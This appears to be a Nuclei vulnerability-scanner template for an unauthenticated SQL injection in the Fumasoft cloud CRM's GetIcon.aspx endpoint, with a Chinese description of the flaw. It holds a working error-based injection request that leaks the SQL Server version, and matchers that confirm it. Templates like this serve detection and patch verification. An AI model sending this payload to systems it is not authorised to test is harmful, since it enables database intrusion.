id: fumasoft-GetIcon-sqli
info:
  name: 孚盟云CRM GetIcon.aspx SQL注入漏洞
  author: leadlife
  severity: high
  description: 上海孚盟软件有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云GetIcon.aspx接口存在 SQL注入漏洞。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性
  reference: 
    - https://mp.weixin.qq.com/s/s1P0rNuRUN7f_a2EZaniZw
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
    tips:
    repair:
    version:
  tags: fumasoft,sqli

http:
  - raw:
      - |
        GET /Common/GetIcon.aspx?FUID=-1'and+1=@@VERSION-- HTTP/1.1
        Host: {{Hostname}}
        
    matchers:
      - type: dsl
        dsl:
          - status_code == 500
          - contains_all(body,'Microsoft SQL Server')
        condition: and